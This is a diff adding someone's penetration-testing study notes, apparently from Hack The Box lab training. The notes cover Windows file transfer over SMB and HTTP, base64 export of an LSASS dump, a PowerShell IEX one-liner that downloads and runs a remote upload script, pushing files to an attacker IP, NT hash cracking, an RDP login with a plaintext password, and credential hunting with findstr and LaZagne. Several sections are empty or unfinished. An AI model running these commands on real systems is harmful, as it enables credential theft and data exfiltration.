@@ -1,0 +1,191 @@
+--------------------------------------------------
+  			File transfer methods
+--------------------------------------------------
+
+[Convert]::ToBase64String((Get-Content -path "C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP" -Encoding byte))
+[Convert]::ToBase64String((Get-Content -path "lsass.DMP" -Encoding byte))
+
+
+The cοnvention is that you look for the POV of the target machine, here: Windows
+
+Download:
+	
+	Copy a File from the SMB Server
+		sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support TempShare /home/ltnbob/Documents/
+
+		copy \\10.10.14.194\TempShare\mimi.zip
+
+for /f "delims=" %f in (new.txt) do move "C:\Source\%f" "C:\Destination\"
+
+--------------------------------------------------
+  		From Windows to Parrot (Download)
+--------------------------------------------------
+
+attack: 10.10.14.124
+target:  move file_name \\attack_IP\share_name
+
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support TempShare /home/ltnbob/Documents/
+
+## afto edw den nomizw oti einai Download agapito mou HTB!!!!
+target:  move file_name \\IP\share_name
+target:  copy file_name \\IP\share_name 
+
+for /f "delims=" %f in (new.txt) do copy "%f" "\\10.10.14.194\TempShare"
+
+--------------------------------------------------
+  		From Parrot to Windows (Upload)
+--------------------------------------------------
+
+PowerShell Web Uploads
+
+	pip3 install uploadserver
+	python3 -m uploadserver
+
+	PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+	PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+
+----------------------------------------------------------------------------------------
+
+Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.
+
+# cracking NT hash
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+
+
+
+xfreerdp /v:10.129.14.194 /u:sadams /p:totally2brow2harmon@
+
+
+LaZagne
+We can also take advantage of third-party tools like LaZagne to quickly discover credentials that web browsers or other installed applications may insecurely store. LaZagne is made up of modules which each target different software when looking for passwords. Some of the common modules are described in the table below:
+
+
+------------------------- ------------------------
+
+
+
+
+
+
+--------------------------------------------------
+  			Workgroup vs Domain
+--------------------------------------------------
+
+A <<workgroup>> is a decentralized, peer-to-peer network where each computer manages its own user 
+accounts and security, making it suitable for small networks like a home or small office.
+	a) peer-to-peer
+	b) decentralized - each computer for itself
+	c) stored local on the computer
+	d) best for small networks (e.g. <=10 computers)
+
+A <<domain>> is a centralized, client-server network managed by a domain controller, which provides 
+centralized authentication, security policies, and resource management, making it ideal for larger organizations.
+	a) client-server
+	b) centralized - managed by a server called a <<Domain Controller>>
+	c) stored centrally on the <<Domain Controller>
+	d) highly scalabale for large networks with many users and devices
+
+To read
+	https://www.reddit.com/r/sysadmin/comments/qmshpw/difference_between_domain_and_workgroup_window/
+
+	https://www.geeksforgeeks.org/computer-networks/difference-between-domain-and-workgroup/
+
+
+
+--------------------------------------------------
+  				SAM database
+--------------------------------------------------
+
+Security Account Manager database: a file in Windows that stores account information, including
+encrypted password hashes. 
+
+Linux equivalent: /etc/shadow (in combination with /etc/passwd)
+
+
+
+
+--------------------------------------------------
+  				NTDS.dit
+--------------------------------------------------
+
+NT Directory Services: the file stored on a domain controller that contains the password hashes of 
+all domain accounts.
+
+.dit = .directory information tree = This is the primary database file associated with AD and stores
+all domain usernames, password hashes, and other critical schema information.Dumping NTDS.dit is the
+proverbial Holy Grail of attacks against a Windows domain.
+
+stored at %systemroot%/ntds
+
+
+[?] SAM database vs NTDS.dit?
+
+--------------------------------------------------
+  					SAM
+--------------------------------------------------
+
+--------------------------------------------------
+  				Active Directory
+--------------------------------------------------
+
+Active Directory (AD) is essentially a DB containing every object, every user account, every 
+computer account, everything in the domain.
+
+
+--------------------------------------------------
+  					x
+--------------------------------------------------
+--------------------------------------------------
+  					DPAPI
+--------------------------------------------------
+
+Data Protection API (DPAPI)
+	is a Windows built-in cryptographic tool that encrypts/decrypts data using the user/machine's
+	ceredentials. 
+
+--------------------------------------------------
+  					HKLM
+--------------------------------------------------
+
+HKEY_LOCAL_MACHINE (HKLM)
+	is a registry hive (κυψέλη) in the Windows OS. It contains configuration information regarding
+	the hardware and software installed on the computer. 
+
+Registry
+	a database that stores settings and options (configuration files I would say) for the
+	OS, applications and user preferences.
+
+
+--------------------------------------------------
+  					cmd commands
+--------------------------------------------------
+
+# use cd in this manner - absolute path
+cd C:\Users\Bob\Desktop\temp
+
+# ls
+dir
+
+# ls only directories
+dir /ad
+
+
+# pwd
+
+# # credential hunting with findstr 
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+
+
+Here are some other places we should keep in mind when credential hunting:
+
+Passwords in Group Policy in the SYSVOL share
+Passwords in scripts in the SYSVOL share
+Password in scripts on IT shares
+Passwords in web.config files on dev machines and IT shares
+Password in unattend.xml
+Passwords in the AD user or computer description fields
+KeePass databases (if we are able to guess or crack the master password)
+Found on user systems and shares
+Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint
